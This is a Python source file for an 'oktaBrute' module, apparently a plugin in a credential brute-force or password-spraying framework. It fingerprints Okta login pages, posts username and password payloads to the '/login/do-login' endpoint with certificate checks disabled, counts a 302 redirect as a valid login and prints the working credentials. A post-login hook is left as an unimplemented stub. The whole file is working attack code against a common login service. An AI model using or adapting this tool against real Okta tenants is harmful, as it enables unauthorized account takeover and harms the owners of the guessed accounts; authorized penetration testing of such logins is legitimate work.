#! /usr/bin/python
from core.webModule import webModule
from requests import session
import requests
import re
from argparse import ArgumentParser
from selenium import webdriver
from urllib2 import urlopen
import urllib2


class oktaBrute(webModule):
    def __init__(self, config, display, lock):
        super(oktaBrute, self).__init__(config, display, lock)
        self.fingerprint="okta" # What is used to fingerprint this web app?
        self.response="302" # What constitutes a valid response?
    def somethingCool(self, config, payload, c, cookies):
        #Do something cool here
        print("[+]  Not yet implemented...working on it")
    def connectTest(self, config, payload, proxy, submitLoc, submitType):
        #Create a session and check if account is valid  THIS IS AN EXAMPLE ONLY
        with session() as c:
            resp1 = c.get(config["HOST"] + '/login/do-login', verify=False)
            cookies = resp1.cookies
            cpost = c.post(config["HOST"] + '/login/do-login', cookies=cookies, data=payload, allow_redirects=False, verify=False)
            m = re.search(self.response, str(cpost))
            if m:
                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
                if not config["dry_run"]:
                    print("[!] Time to do something cool!")
                    self.somethingCool(config, payload, c, cookies)
            else:
                print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
